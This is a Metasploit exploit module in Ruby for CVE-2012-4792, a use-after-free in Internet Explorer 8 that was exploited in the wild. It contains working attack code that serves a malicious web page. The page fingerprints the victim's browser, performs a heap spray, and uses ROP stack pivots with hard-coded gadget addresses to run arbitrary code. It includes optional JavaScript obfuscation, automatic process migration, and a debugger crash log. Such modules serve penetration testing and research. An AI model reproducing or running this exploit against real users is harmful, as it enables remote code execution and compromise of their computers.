##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Microsoft Internet Explorer CDwnBindInfo Object Use-After-Free Vulnerability",
      'Description'    => %q{
          This module exploits a vulnerability found in Microsoft Internet Explorer. A
        use-after-free condition occurs when a CButton object is freed, but a reference
        is kept and used again during a page reload, an invalid memory that's controllable
        is used, and allows arbitrary code execution under the context of the user.

          Please note: This vulnerability has been exploited in the wild targeting
        mainly China/Taiwan/and US-based computers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'eromang',
          'mahmud ab rahman',
          'juan vazquez',
          'sinn3r'  #Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4792' ],
          [ 'US-CERT-VU', '154201' ],
          [ 'BID', '57070' ],
          [ 'URL', 'http://blog.fireeye.com/research/2012/12/council-foreign-relations-water-hole-attack-details.html'],
          [ 'URL', 'http://eromang.zataz.com/2012/12/29/attack-and-ie-0day-informations-used-against-council-on-foreign-relations/'],
          [ 'URL', 'http://blog.vulnhunt.com/index.php/2012/12/29/new-ie-0day-coming-mshtmlcdwnbindinfo-object-use-after-free-vulnerability/' ],
          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2794220' ],
          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2012/12/29/new-vulnerability-affecting-internet-explorer-8-users.aspx' ]
        ],
      'Payload'        =>
        {
          'Space'        => 980,
          'DisableNops' => true,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [ 'IE 8 on Windows XP SP3',       { 'Rop' => :msvcrt, 'Offset' => '0x586' } ], # 0x0c0c0b30
          [ 'IE 8 on Windows Vista',        { 'Rop' => :jre,    'Offset' => '0x586' } ], # 0x0c0c0b30
          [ 'IE 8 on Windows Server 2003',  { 'Rop' => :msvcrt, 'Offset' => '0x586' } ], # 0x0c0c0b30
          [ 'IE 8 on Windows 7',            { 'Rop' => :jre,    'Offset' => '0x586' } ]  # 0x0c0c0b30
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Dec 27 2012",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
    ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

    ie_name = "IE #{ie}"

    case nt
    when '5.1'
      os_name = 'Windows XP SP3'
    when '5.2'
      os_name = 'Windows Server 2003'
    when '6.0'
      os_name = 'Windows Vista'
    when '6.1'
      os_name = 'Windows 7'
    else
      # OS not supported
      return nil
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape(Rex::Text.rand_text_alpha(4), Rex::Arch.endian(target.arch))

    # Land the payload at 0x0c0c0b30
    js = %Q|
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");
    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);
    heap_obj.gc();
    for (var i=1; i < 0x300; i++) {
      heap_obj.alloc(block);
    }
    |

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return code if t['Rop'].nil?

=begin
Stack Pivoting to eax:
0:008> db eax
0c0c0b30  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
0c0c0b40  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
=end
    # Both ROP chains generated by mona.py - See corelan.be
    case t['Rop']
    when :msvcrt
      print_status("Using msvcrt ROP")
      if t.name =~ /Windows XP/
        stack_pivot = [0x77c15ed6].pack("V") * 54 # ret
        stack_pivot << [0x77c2362c].pack("V") # pop ebx, #ret
        stack_pivot << [0x77c15ed5].pack("V") # xchg eax,esp # ret # 0x0c0c0c0c
        rop_payload = generate_rop_payload('msvcrt', code, {'pivot'=>stack_pivot, 'target'=>'xp'})
      else
        stack_pivot = [0x77bcba5f].pack("V") * 54 # ret
        stack_pivot << [0x77bb4158].pack("V") # pop ebx, #ret
        stack_pivot << [0x77bcba5e].pack("V") # xchg eax,esp # ret # 0x0c0c0c0c
        rop_payload = generate_rop_payload('msvcrt', code, {'pivot'=>stack_pivot, 'target'=>'2003'})
      end
    else
      print_status("Using JRE ROP")
      stack_pivot = [0x7c348b06].pack("V") * 54 # ret
      stack_pivot << [0x7c341748].pack("V") # pop ebx, #ret
      stack_pivot << [0x7c348b05].pack("V") # xchg eax,esp # ret # 0x0c0c0c0c
      rop_payload = generate_rop_payload('java', code, {'pivot'=>stack_pivot})
    end

    return rop_payload
  end

  def load_exploit_html(my_target, cli)

    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)

    html = %Q|
    <!doctype html>
    <html>
    <head>
    <script>
    #{js}

    function exploit()
    {
      var e0 = null;
      var e1 = null;
      var e2 = null;
      var arrObject = new Array(3000);
      var elmObject = new Array(500);
      for (var i = 0; i < arrObject.length; i++)
      {
        arrObject[i] = document.createElement('div');
        arrObject[i].className = unescape("ababababababababababababababababababababa");
      }

      for (var i = 0; i < arrObject.length; i += 2)
      {
        arrObject[i].className = null;
      }

      CollectGarbage();

      for (var i = 0; i < elmObject.length; i ++)
      {
        elmObject[i] = document.createElement('button');
      }

      for (var i = 1; i < arrObject.length; i += 2)
      {
        arrObject[i].className = null;
      }

      CollectGarbage();

      try {
        e0 = document.getElementById("a");
        e1 = document.getElementById("b");
        e2 = document.createElement("q");
        e1.applyElement(e2);
        e1.appendChild(document.createElement('button'));
        e1.applyElement(e0);
        e2.outerText = "";
        e2.appendChild(document.createElement('body'));
      } catch(e) { }
      CollectGarbage();
      for(var i =0; i < 20; i++)
      {
        arrObject[i].className = unescape("ababababababababababababababababababababa");
      }
      var eip = window;
      var data = "#{Rex::Text.rand_text_alpha(41)}";
      eip.location = unescape("%u0b30%u0c0c" + data);

    }

    </script>
    </head>
    <body onload="eval(exploit())">
    <form id="a">
    </form>
    <dfn id="b">
    </dfn>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, '')
    print_status("Sending HTML...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end


=begin
(87c.f40): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=12120d0c ebx=0023c218 ecx=00000052 edx=00000000 esi=00000000 edi=0301e400
eip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
mshtml!CMarkup::OnLoadStatusDone+0x504:
637848c3 ff90dc000000    call    dword ptr <Unloaded_Ed20.dll>+0xdb (000000dc)[eax] ds:0023:12120de8=????????
0:008> k
ChildEBP RetAddr
020bf8a4 635c378b mshtml!CMarkup::OnLoadStatusDone+0x504
020bf8c4 635c3e16 mshtml!CMarkup::OnLoadStatus+0x47
020bfd10 636553f8 mshtml!CProgSink::DoUpdate+0x52f
020bfd24 6364de62 mshtml!CProgSink::OnMethodCall+0x12
020bfd58 6363c3c5 mshtml!GlobalWndOnMethodCall+0xfb
020bfd78 7e418734 mshtml!GlobalWndProc+0x183
020bfda4 7e418816 USER32!InternalCallWinProc+0x28
020bfe0c 7e4189cd USER32!UserCallWinProcCheckWow+0x150
020bfe6c 7e418a10 USER32!DispatchMessageWorker+0x306
020bfe7c 01252ec9 USER32!DispatchMessageW+0xf
020bfeec 011f48bf IEFRAME!CTabWindow::_TabWindowThreadProc+0x461
020bffa4 5de05a60 IEFRAME!LCIETab_ThreadProc+0x2c1
020bffb4 7c80b713 iertutil!CIsoScope::RegisterThread+0xab
020bffec 00000000 kernel32!BaseThreadStart+0x37

0:008> r
eax=0c0c0c0c ebx=0023c1d0 ecx=00000052 edx=00000000 esi=00000000 edi=033e9120
eip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CMarkup::OnLoadStatusDone+0x504:
637848c3 ff90dc000000    call    dword ptr [eax+0DCh] ds:0023:0c0c0ce8=????????

=end
